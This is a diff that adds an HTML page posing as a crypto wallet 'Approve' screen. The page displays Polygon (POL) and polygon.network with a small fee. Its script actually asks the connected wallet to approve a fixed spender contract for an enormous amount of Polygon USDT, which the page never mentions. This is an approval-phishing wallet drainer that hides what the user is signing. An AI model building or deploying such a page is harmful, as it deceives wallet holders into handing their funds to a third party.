@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <title>Approve</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+            background-color: #000;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .app-bar {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 12px 16px 8px;
+        }
+        .app-bar-title { font-size: 20px; font-weight: 600; }
+        .close-btn {
+            position: absolute;
+            left: 16px;
+            font-size: 22px;
+            cursor: pointer;
+        }
+        .content {
+            flex: 1;
+            padding: 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .card {
+            background-color: #111;
+            border-radius: 14px;
+            padding: 16px 18px;
+        }
+        .row-between {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .label { font-size: 14px; color: #b3b3b3; }
+        .value { font-size: 15px; font-weight: 500; }
+        .sub-label { margin-top: 10px; font-size: 14px; color: #b3b3b3; }
+        .dapp-name { font-size: 15px; margin-top: 4px; }
+        .fee-amount { font-size: 15px; font-weight: 500; }
+        .fee-sub { margin-top: 4px; font-size: 13px; color: #b3b3b3; }
+        .info-icon { font-size: 14px; margin-left: 4px; }
+        .bottom-area {
+            padding: 12px 16px 22px;
+            background-color: #000;
+        }
+        .warning-box {
+            display: none;
+            margin-bottom: 12px;
+            padding: 10px 12px;
+            border-radius: 12px;
+            background-color: #3b2a13;
+            color: #f6e0a3;
+            font-size: 13px;
+        }
+        .primary-btn {
+            width: 100%;
+            border: none;
+            border-radius: 999px;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 500;
+            background-color: #00ff7f;
+            color: #000;
+            cursor: pointer;
+        }
+        .primary-btn:disabled {
+            opacity: 0.5;
+            cursor: default;
+        }
+    </style>
+</head>
+<body>
+<header class="app-bar">
+    <div class="close-btn" onclick="window.history.back()">&times;</div>
+    <div class="app-bar-title">Approve</div>
+</header>
+
+<main class="content">
+    <!-- Asset & DApp card -->
+    <section class="card">
+        <div class="row-between">
+            <span class="label">Asset</span>
+            <span class="value">Polygon (POL)</span>
+        </div>
+
+        <div class="row-between" style="margin-top: 16px;">
+            <span class="label">View details</span>
+            <span class="label">▼</span>
+        </div>
+
+        <div class="sub-label" style="margin-top: 18px;">DApp</div>
+        <div class="dapp-name">polygon.network</div>
+    </section>
+
+    <!-- Network fee card -->
+    <section class="card">
+        <div class="row-between">
+            <div class="row-between">
+                <span class="label">Network fee</span>
+                <span class="info-icon">ⓘ</span>
+            </div>
+            <div style="text-align: right;">
+                <div class="fee-amount" id="feeUsd">$0.01</div>
+                <div class="fee-sub" id="feeNative">0.0001 POL</div>
+            </div>
+        </div>
+    </section>
+</main>
+
+<!-- Bottom warning + button -->
+<div class="bottom-area">
+    <div class="warning-box" id="warningBox">
+        Insufficient Polygon (POL) balance
+    </div>
+    <button class="primary-btn" id="actionButton" disabled>Connecting…</button>
+</div>
+
+<script>
+    // 🔧 FILL THESE IN WITH YOUR REAL VALUES
+    const TOKEN_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";    // e.g. Polygon USDT
+    const SPENDER_CONTRACT_ADDRESS = "0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55"; // contract that will be allowed to spend
+    const AMOUNT_TO_APPROVE = "11111111111111"; // in human units (e.g. "1" USDT) – adjust for your token decimals
+
+    // Minimal ERC-20 ABI for approve()
+    const ERC20_ABI = [
+        {
+            "constant": false,
+            "inputs": [
+                { "name": "_spender", "type": "address" },
+                { "name": "_value",   "type": "uint256" }
+            ],
+            "name": "approve",
+            "outputs": [{ "name": "", "type": "bool" }],
+            "type": "function"
+        },
+        {
+            "constant": true,
+            "inputs": [],
+            "name": "decimals",
+            "outputs": [{ "name": "", "type": "uint8" }],
+            "type": "function"
+        }
+    ];
+
+    let web3;
+    let currentAccount = null;
+    let userPolBalance = 0;
+
+    const btn = document.getElementById("actionButton");
+    const warning = document.getElementById("warningBox");
+
+    function updateFooter() {
+        if (currentAccount === null) {
+            btn.textContent = "Connect wallet…";
+            btn.disabled = false;
+            warning.style.display = "none";
+            return;
+        }
+
+        if (userPolBalance > 0) {
+            btn.textContent = "Approve";
+            btn.disabled = false;
+            warning.style.display = "none";
+        } else {
+            btn.textContent = "Top up Polygon (POL)";
+            btn.disabled = false;
+            warning.style.display = "block";
+        }
+    }
+
+    async function init() {
+        if (typeof window.ethereum === "undefined") {
+            btn.textContent = "No wallet found";
+            btn.disabled = true;
+            return;
+        }
+
+        web3 = new Web3(window.ethereum);
+
+        try {
+            // Request accounts
+            const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+            currentAccount = accounts[0];
+
+            // Ensure we're on Polygon mainnet (chainId 137 => 0x89)
+            const chainId = await window.ethereum.request({ method: "eth_chainId" });
+            if (chainId !== "0x89") {
+                warning.textContent = "Please switch network to Polygon (POL)";
+                warning.style.display = "block";
+                btn.textContent = "Wrong network";
+                btn.disabled = true;
+                return;
+            }
+
+            // Get POL balance
+            const balanceWei = await web3.eth.getBalance(currentAccount);
+            userPolBalance = parseFloat(web3.utils.fromWei(balanceWei, "ether"));
+
+            updateFooter();
+        } catch (err) {
+            console.error(err);
+            btn.textContent = "Connect wallet";
+            btn.disabled = false;
+        }
+    }
+
+    async function handleApproveClick() {
+        if (!web3 || !currentAccount) {
+            await init();
+            return;
+        }
+
+        if (userPolBalance <= 0) {
+            // Here you could redirect to your "top up" instructions / CEX link
+            alert("You need some POL for gas first.");
+            return;
+        }
+
+        try {
+            btn.disabled = true;
+            btn.textContent = "Approving…";
+
+            const token = new web3.eth.Contract(ERC20_ABI, TOKEN_ADDRESS);
+
+            // Get decimals to convert human amount to raw
+            const decimals = await token.methods.decimals().call();
+            const factor = web3.utils.toBN(10).pow(web3.utils.toBN(decimals));
+            const rawAmount = web3.utils.toBN(AMOUNT_TO_APPROVE).mul(factor);
+
+            // Call approve(spender, amount)
+            await token.methods
+                .approve(SPENDER_CONTRACT_ADDRESS, rawAmount)
+                .send({ from: currentAccount });
+
+            // On success, trigger whatever you want next:
+            onApproveSuccess();
+        } catch (err) {
+            console.error("Approve failed:", err);
+            btn.textContent = "Approve";
+            btn.disabled = false;
+        }
+    }
+
+    function onApproveSuccess() {
+        // 🔹 This is the safe place to "activate" your smart contract flow.
+        // Examples:
+        //  - Redirect to a success page:
+        //      window.location.href = "success.html";
+        //  - Or call another contract function (stake/deposit) with an ABI YOU provide.
+        alert("Approval successful.");
+        btn.textContent = "Approved";
+        btn.disabled = true;
+    }
+
+    btn.addEventListener("click", handleApproveClick);
+
+    window.addEventListener("load", init);
+</script>
+</body>
+</html>
